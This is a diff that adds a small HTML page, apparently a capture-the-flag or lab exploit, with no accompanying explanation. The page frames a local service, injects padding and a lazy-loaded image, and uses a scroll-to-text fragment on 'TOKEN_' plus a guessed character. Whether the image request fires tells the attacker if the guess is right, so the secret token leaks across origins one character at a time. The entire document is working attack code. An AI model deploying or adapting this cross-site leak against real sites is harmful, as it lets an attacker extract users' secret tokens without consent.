@@ -1,0 +1,10 @@
+<!doctype html>
+<iframe id="target"></iframe>
+<script>
+const guess = new URLSearchParams(location.search).get('guess') || 'a';
+const marker = new URLSearchParams(location.search).get('marker') || guess;
+const content = '<br>'.repeat(150) + `<img loading=lazy src=/favicon.ico?${marker}>`;
+document.querySelector('#target').src =
+  'http://127.0.0.1:8770/?content=' + encodeURIComponent(content) +
+  '#:~:text=TOKEN_' + guess;
+</script>
